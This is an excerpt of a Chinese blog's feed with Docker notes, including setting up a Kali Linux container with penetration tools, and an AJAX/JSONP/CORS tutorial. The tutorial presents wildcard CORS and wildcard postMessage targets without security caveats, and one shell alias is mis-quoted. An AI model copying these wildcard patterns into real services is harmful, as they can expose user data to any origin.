class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ["fn", [&lt;arg1&gt;, &lt;arg2&gt;, ...], &lt;exp&gt;]</span></span><br><span class="line"><span class="comment">// There are two closures: one is when the function is created,</span></span><br><span class="line"><span class="comment">// another one is when the function is called.</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> macro(<span class="function">(<span class="params">ctx</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="keyword">this</span>: Context</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (countStack(<span class="keyword">this</span>) &gt; maxStackSize)</span><br><span class="line">            error(<span class="keyword">this</span>, <span class="string">'call stack overflow'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> &#123; ast &#125; = ctx</span><br><span class="line"></span><br><span class="line">        <span class="comment">// generate a closure sandbox based on the parent sandbox</span></span><br><span class="line">        <span class="keyword">var</span> closure = <span class="built_in">Object</span>.create(ctx.sandbox)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// overwrite arguments to closure</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, len = ast[<span class="number">1</span>].length; i &lt; len; i++) &#123;</span><br><span class="line">            closure[ast[<span class="number">1</span>][i]] = <span class="built_in">arguments</span>[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> run(ast[<span class="number">2</span>], closure, ctx.env, <span class="keyword">this</span>, ctx.index);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nisp&quot;&gt;&lt;a href=&quot;#Nisp&quot; class=&quot;headerlink&quot; title=&quot;Nisp&quot;&gt;&lt;/a&gt;Nisp&lt;/h1&gt;&lt;h2 id=&quot;什么是Nisp-？&quot;&gt;&lt;a href=&quot;#什么是Nisp-？&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://www.ycjcl.cc/2018/07/08/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.ycjcl.cc/2018/07/08/Docker学习笔记/</id>
    <published>2018-07-08T15:43:27.000Z</published>
    <updated>2018-07-08T15:43:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在美团∙点评前端基础技术团队里，需要装<code>Docker</code>，平台运行测试在<code>Docker</code>里，于是有了下文的<code>Docker</code>入坑记。</p></blockquote><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">Docker官网地址</a></p><p><a href="https://docs.docker.com/engine/installation/#platform-support-matrix" target="_blank" rel="noopener">各种系统版本(Windows/MacOS/Linux)</a></p><p>装好后，就是个小鲸鱼的图标，</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-3-13/46642938-file_1489389332728_d5e7.png" alt=""></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>一般使用是在<code>终端</code>里，所以打开终端，先运行三条命令，测试下<code>docker</code>安装情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker --version</span><br><span class="line">Docker version 17.03.0-ce, build 60ccb22</span><br><span class="line"></span><br><span class="line">$ docker-compose --version</span><br><span class="line">docker-compose version 1.11.2, build dfed245</span><br><span class="line"></span><br><span class="line">$ docker-machine --version</span><br><span class="line">docker-machine version 0.10.0, build 76ed2a6</span><br></pre></td></tr></table></figure><h4 id="开启容器"><a href="#开启容器" class="headerlink" title="开启容器"></a>开启容器</h4><p>这里，运行<code>nginx</code>，将本机的80端口映射到<code>docker</code>里的80端口，容器名为<code>webserver</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 80:80 --name webserver nginx</span><br></pre></td></tr></table></figure><p>然后访问<code>http://localhost</code>，就看到配好的<code>nginx</code>。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-3-13/71278965-file_1489389325557_1792b.png" alt=""></p><h4 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h4><p>关闭容器，先得知道<code>容器的id</code>，所以这里先查看一下<code>容器的id</code>,使用<code>docker ps -a</code>或者<code>docker images</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line"></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                     PORTS               NAMES</span><br><span class="line">96d00fcc948b        nginx               <span class="string">"nginx -g 'daemon ..."</span>   19 minutes ago      Exited (0) 5 minutes ago                       webserver</span><br></pre></td></tr></table></figure><p>然后有一个id号<code>96d00fcc948b</code>，关闭时，只需要输入前几名就可以了，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop 96d0</span><br></pre></td></tr></table></figure><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><p>输入<code>docker</code>镜像的<code>name</code>名(查看方法用<code>docker ps -a</code>)，删除就用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm -f webserver1</span><br></pre></td></tr></table></figure><h3 id="在Docker里安装Kali"><a href="#在Docker里安装Kali" class="headerlink" title="在Docker里安装Kali"></a>在Docker里安装Kali</h3><ul><li>首先在终端输入(使用了国内的镜像，官方的超级慢)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull hub.c.163.com/vamvam/kalilinux:latest</span><br></pre></td></tr></table></figure><ul><li>安装完成后，查看下镜像</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br></pre></td></tr></table></figure><ul><li>直接运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name Kali -t -i hub.c.163.com/vamvam/kalilinux /bin/bash</span><br></pre></td></tr></table></figure><ul><li>更新各种软件</li></ul><p>因为使用了国内镜像，所以 <code>apt-get</code> 的源也是国内的，非常之快</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade -y</span><br></pre></td></tr></table></figure><p>安装渗透工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install metasploit-framework nmap git sqlmap websploit kali-linux-wireless aircrack-ng pciutils</span><br><span class="line"> -y</span><br></pre></td></tr></table></figure><ul><li>安装完后，需要保存容器状态， Ctrl-p + Ctrl-q.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker commit -m <span class="string">"add hydra"</span> 容器id REPOSITORY</span><br></pre></td></tr></table></figure><p><img src="http://i1.piimg.com/567571/a62ce4d543bd125d.png" alt=""></p><p>为了与本机Mac实现共享数据，在 Mac 中新建了一个共享空目录 <code>/Users/jcl/Desktop/Kali_File</code> ，在 <code>Kali</code> 中新建了一个目录 <code>/jcl</code>  ，然后使用在 <code>docker run</code> 命令之后添加 <code>-v /Users/jcl/Desktop/Kali_File:/jcl</code> 来挂载本机目录。</p><p>退出时，直接输入 <code>exit</code> 。<br>使用时，输入自定义的命令开启(我在 <code>.zshrc</code> 中的自定义)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim ~/.zshrc 或者 ~/.bash_profile</span><br><span class="line"></span><br><span class="line"><span class="built_in">alias</span>=<span class="string">"alias run-kali="</span>docker run -it -v /Users/jcl/Desktop/Kali_File:/jcl kali /bin/bash<span class="string">"</span></span><br></pre></td></tr></table></figure><p><img src="http://i4.buimg.com/567571/cc1ab98331f6fb91.png" alt=""></p><p>$ docker build -t {hash} .<br>$ docker ps<br>$ docker kill {containerName}<br>$ docker run -d -P {hash}</p><blockquote><p>参考: <a href="https://miteshshah.github.io/mac/kali-linux-and-metasploit-with-docker/" target="_blank" rel="noopener">Kali Linux and Metasploit With Docker</a>、<a href="http://dockone.io/article/783" target="_blank" rel="noopener">10张图带你深入理解Docker容器和镜像</a>、<a href="http://wobushi.cn/?p=123123308" target="_blank" rel="noopener">在docker容器中运行kali linux </a>、<a href="https://xudafeng.github.io/slide/archives/docker-in-practice/" target="_blank" rel="noopener">Docker从入门到实践</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;在美团∙点评前端基础技术团队里，需要装&lt;code&gt;Docker&lt;/code&gt;，平台运行测试在&lt;code&gt;Docker&lt;/code&gt;里，于是有了下文的&lt;code&gt;Docker&lt;/code&gt;入坑记。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>深入学习下AJAX</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B8%8BAJAX/"/>
    <id>https://www.ycjcl.cc/2018/07/08/深入学习下AJAX/</id>
    <published>2018-07-07T17:18:40.000Z</published>
    <updated>2018-07-07T17:19:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>AJAX虽说是最早接触的，但一直只停留在业务层面，没能对其内部进行深究，今天就对AJAX和JSONP深入学习下。</p></blockquote><h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><h3 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h3><p><a href="https://zh.wikipedia.org/wiki/AJAX" target="_blank" rel="noopener">AJAX维基百科解释</a></p><h3 id="二、核心对象XMLHttpRequest"><a href="#二、核心对象XMLHttpRequest" class="headerlink" title="二、核心对象XMLHttpRequest"></a>二、核心对象XMLHttpRequest</h3><blockquote><p>The XMLHttpRequest.abort() method aborts the request if it has already been sent. When a request is aborted, its readyState is set to 0 (UNSENT), but the readystatechange event is not fired (译文：XMLHttpRequest 是一个API, 它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。)</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/65992791-file_1487145378879_ef8e.png" alt=""></p><p>该对象请求是<strong>异步执行</strong>的，所以要通过<strong>回调函数(onreadystatechange)</strong>获得响应，对象主要是通过<code>open()</code>、<code>send()</code>、方法并组合<code>readyState</code>、<code>status</code>、<code>responseText</code>属性来完成的。 下面来说下<code>AJAX</code>步骤：</p><h3 id="三、步骤"><a href="#三、步骤" class="headerlink" title="三、步骤"></a>三、步骤</h3><h4 id="①-创建兼容的XMLHttpRequest对象"><a href="#①-创建兼容的XMLHttpRequest对象" class="headerlink" title="① 创建兼容的XMLHttpRequest对象"></a>① 创建兼容的XMLHttpRequest对象</h4><p>该对象需要兼容下浏览器(毕竟奇葩的 IE)，通用的兼容方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 跨浏览器兼容</span></span><br><span class="line"><span class="keyword">var</span> xhr;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> XMLHttpRequest != <span class="string">"undefined"</span>)&#123;</span><br><span class="line">xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject)&#123;</span><br><span class="line"><span class="keyword">var</span> aVersions = [<span class="string">"Microsoft.XMLHttp"</span>,<span class="string">"Msxml2.XMLHttp.5.0"</span>,<span class="string">"Msxml2.XMLHttp.4.0"</span>,<span class="string">"Msxml2.XMLHttp.3.0"</span>,<span class="string">"Msxml2.XMLHttp"</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;aVersions.length;i++)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">xhr = <span class="keyword">new</span> ActiveXObject(aVersions);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-初始化连接open"><a href="#②-初始化连接open" class="headerlink" title="② 初始化连接open()"></a>② 初始化连接open()</h4><p><code>xhr.open(method,url[,async, user, password])</code>，有三个参数，<code>method</code>有<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>方法，<code>url</code>是数据接口地址，<code>async(可选)</code>是否异步(<code>true</code>(默认)/<code>false</code>)，<code>user(可选)、password(可选)</code>使用的比较少。</p><p>然后建立连接：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(<span class="string">'GET'</span>,<span class="string">'http://localhost:3000/api/test'</span>);</span><br></pre></td></tr></table></figure><h4 id="③-发送请求send"><a href="#③-发送请求send" class="headerlink" title="③ 发送请求send()"></a>③ 发送请求send()</h4><p><code>xhr.send(data)</code>，<code>data</code>可以是任意类型的数据，若是<code>GET</code> 请求方式，<code>data</code>可以为空/<code>null</code>。</p><p>发送请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlHttp.send();</span><br></pre></td></tr></table></figure><h4 id="④-等待回调结果"><a href="#④-等待回调结果" class="headerlink" title="④ 等待回调结果"></a>④ 等待回调结果</h4><p>使用<code>onreadystatechange</code>回调函数，处理数据各种状态。当<code>readyState</code>为4，且<code>status</code>为200时，就返回成功。其它状态请参考下图。</p><p><code>readyState</code>码：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/50710653-file_1487145412385_5308.png" alt=""></p><p>HTTP状态码(<code>status</code>)：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/14231422-file_1487144870551_12d0c.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">// 状态发生变化时，函数被回调</span></span><br><span class="line"><span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123; <span class="comment">// 成功完成</span></span><br><span class="line"><span class="comment">// 判断响应结果：</span></span><br><span class="line"><span class="keyword">if</span>(xhr.status === <span class="number">200</span>)&#123;</span><br><span class="line"><span class="comment">// 成功</span></span><br><span class="line"><span class="built_in">document</span>.write(xhr.responseText);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'\n'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 失败</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'失败\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'还在请求中...\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="解决跨域问题"><a href="#解决跨域问题" class="headerlink" title="解决跨域问题"></a>解决跨域问题</h2><blockquote><p>首先需要知道，什么是跨域？同一域有哪些条件？</p></blockquote><h3 id="一、什么是跨域"><a href="#一、什么是跨域" class="headerlink" title="一、什么是跨域"></a>一、什么是跨域</h3><p>下图是我在<code>http://localhost</code>(默认80端口)，去访问<code>http://localhost:3000/api/test</code>的数据接口，结果无法访问，就涉及到跨域问题。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/63081559-file_1487137267455_14420.png" alt=""></p><h3 id="二、同域条件"><a href="#二、同域条件" class="headerlink" title="二、同域条件"></a>二、同域条件</h3><ol><li>域名相同(<a href="http://ycjcl.cc和http://ycjcl.cc)是不一样的" target="_blank" rel="noopener">http://ycjcl.cc和http://ycjcl.cc)是不一样的</a></li><li>端口一样(<a href="http://localhost:80和http://localhost:3000)是不一样的" target="_blank" rel="noopener">http://localhost:80和http://localhost:3000)是不一样的</a> (可能少数浏览器支持端口不一致访问，毕竟极少)</li><li>协议一致(要么是https，要么是http)</li></ol><h3 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h3><h4 id="1、设置header头-cors-Access-Control-Allow-Origin"><a href="#1、设置header头-cors-Access-Control-Allow-Origin" class="headerlink" title="1、设置header头(cors)Access-Control-Allow-Origin: *"></a>1、设置header头(cors)<code>Access-Control-Allow-Origin: *</code></h4><p>此方法只需要在服务器端设置，<code>*</code>代表任意请求来源，如果只想让特定的域名访问，直接改成<code>http://example</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">'/api/test'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> json = &#123;</span><br><span class="line"><span class="string">'title'</span>:<span class="string">'Kylin'</span>,</span><br><span class="line"><span class="string">'Content'</span>:<span class="string">'AjaxTest'</span></span><br><span class="line">&#125;;</span><br><span class="line">res.header(<span class="string">'Access-Control-Allow-Origin'</span>,<span class="string">'*'</span>);</span><br><span class="line">res.json(json);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="2、JSONP-服务器端-客户端"><a href="#2、JSONP-服务器端-客户端" class="headerlink" title="2、JSONP(服务器端+客户端):"></a>2、JSONP(服务器端+客户端):</h4><p><a href="https://zh.wikipedia.org/wiki/JSONP" target="_blank" rel="noopener">JSONP(JSON with Padding)解释</a>，</p><h5 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h5><p>如果是<code>Express</code>写得后台，可以使用JSONP封装方法<code>res.jsonp()</code>，其它语言/框架写得后台，转换方法就是将<code>data</code>转成<code>callback(data)</code>，用一个函数名callback(其它名也可以，需要和前端约定，默认为callback)将数据包起来，原理通过比较理解。</p><p>通过比较<code>res.json()</code>和<code>res.jsonp()</code>发现，<code>JSONP</code>是利用<code>&lt;script src=&quot;url&quot;&gt;&lt;/script&gt;</code>脚本可以跨域的特点，去访问外部资源。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/86025620-file_1487137267627_3397.png" alt=""></p><p>通过比较源码，差别如下：<br>1.增加了<code>callback</code>变量，<code>app.get(&#39;jsonp callback name&#39;)</code>值默认为<code>callback</code>，这行代码是获取<code>url地址上的?callback=</code>后面的回调函数名。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/92245160-file_1487137646413_5383.png" alt=""></p><p>2.源码中的<code>X-Content-Type-Options: nosniff</code>是用来增强安全性，防止<code>js</code>脚本被恶意执行。参考<a href="https://imququ.com/post/web-security-and-response-header.html#toc-3" target="_blank" rel="noopener">HTTP安全响应头 X-Content-Type-Options</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank" rel="noopener">MDN X-Content-Type-Options</a></p><p>3.后面代码<code>body = &#39;/**/ typeof &#39; + callback + &#39; === \&#39;function\&#39; &amp;&amp; &#39; + callback + &#39;(&#39; + body + &#39;);&#39;;</code>大致意思就是将<code>data</code>数据传成<code>callback(data)</code>这 种形式</p><h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><p>通过创建<code>script</code>标签去获取：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">"http://localhost:3000/api/test?callback=callback"</span>;</span><br><span class="line"><span class="comment">// 创建script标签，设置其属性</span></span><br><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.setAttribute(<span class="string">'src'</span>, url);</span><br><span class="line"><span class="comment">// 把script标签加入head，此时调用开始</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(script);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> callback =  <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> sum=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> data)&#123;</span><br><span class="line">        sum += data[<span class="string">'title'</span>];</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].innerHTML = sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/27783969-file_1487140563630_bdfb.png" alt=""></p><h3 id="3、Node服务器代理-服务器-："><a href="#3、Node服务器代理-服务器-：" class="headerlink" title="3、Node服务器代理(服务器)："></a>3、Node服务器代理(服务器)：</h3><p>就是开一个 node 服务，去代理请求，做一层转发，然后将前端放在 node 服务上。</p><h4 id="4、Fetch-客户端"><a href="#4、Fetch-客户端" class="headerlink" title="4、Fetch(客户端):"></a>4、Fetch(客户端):</h4><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/GlobalFetch" target="_blank" rel="noopener">GlobalFetch</a>、<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" target="_blank" rel="noopener">FetchAPI</a>、<a href="https://www.w3ctech.com/topic/854?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">这个API很“迷人”</a></p></blockquote><p>新的 API 请求属性，使用也很简便，也能跨域。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myImage = <span class="built_in">document</span>.querySelector(<span class="string">'img'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myRequest = <span class="keyword">new</span> Request(<span class="string">'flowers.jpg'</span>);</span><br><span class="line"></span><br><span class="line">fetch(myRequest).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> response.blob();</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> objectURL = URL.createObjectURL(response);</span><br><span class="line">  myImage.src = objectURL;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="5、postMessage"><a href="#5、postMessage" class="headerlink" title="5、postMessage"></a>5、postMessage</h4><p>主页面向子页面发请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="built_in">window</span>.frames[<span class="number">0</span>].postMessage(<span class="string">'hello'</span>,<span class="string">'http://ycjcl.cc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子页面监听并响应信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.source!=<span class="built_in">window</span>.parent) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">var</span> hello=<span class="string">'world'</span>;</span><br><span class="line">    <span class="built_in">window</span>.parent.postMessage(hello,<span class="string">'*'</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h4 id="6、webpack-proxyTable-代理跨域"><a href="#6、webpack-proxyTable-代理跨域" class="headerlink" title="6、webpack proxyTable 代理跨域"></a>6、webpack proxyTable 代理跨域</h4><p>在 webpack 里直接配置 <code>proxyTable</code> 属性就行了，这样当访问 <code>/api</code> 时，实际上访问的是 <code>http://api.ycjcl.cc/info</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">proxyTable: &#123;</span><br><span class="line">      <span class="string">'/api'</span>: &#123;</span><br><span class="line">        target: <span class="string">'http://api.ycjcl.cc/info/'</span>,</span><br><span class="line">        changeOrigin: <span class="literal">true</span>,</span><br><span class="line">        pathRewrite: &#123;</span><br><span class="line">          <span class="string">'^/api'</span>: <span class="string">''</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文章有很多地方描述的可能不是很准确，提到的点也不够全面，如果有不对的地方，还望斧正！</p><blockquote><p>参考：<a href="https://developer.mozilla.org/zh-CN/docs/AJAX/Getting_Started" target="_blank" rel="noopener">AJAX Getting_Started</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener">MDN XMLHttpRequest</a>、<a href="https://zh.wikipedia.org/wiki/JSONP" target="_blank" rel="noopener">维基百科JSONP</a>、<a href="http://www.cnblogs.com/zhouj/p/5818761.html" target="_blank" rel="noopener">HTTP状态码</a>、<a href="http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434499861493e7c35be5e0864769a2c06afb4754acc6000" target="_blank" rel="noopener">廖大神AJAX教程</a>、<a href="http://www.jianshu.com/p/c94e49772123" target="_blank" rel="noopener">Ajax总结篇</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;AJAX虽说是最早接触的，但一直只停留在业务层面，没能对其内部进行深究，今天就对AJAX和JSONP深入学习下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;AJAX&quot;&gt;&lt;a href=&quot;#AJAX&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Module.exports和exports的区别</title>
    <link href="https://www.ycjcl.cc/2018/07/08/Module.exports%E5%92%8Cexports%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>https://www.ycjcl.cc/2018/07/08/Module.exports和exports的区别/</id>
    <published>2018-07-07T17:18:05.000Z</published>
    <updated>2018-07-07T17:18:22.000Z</updated>
    
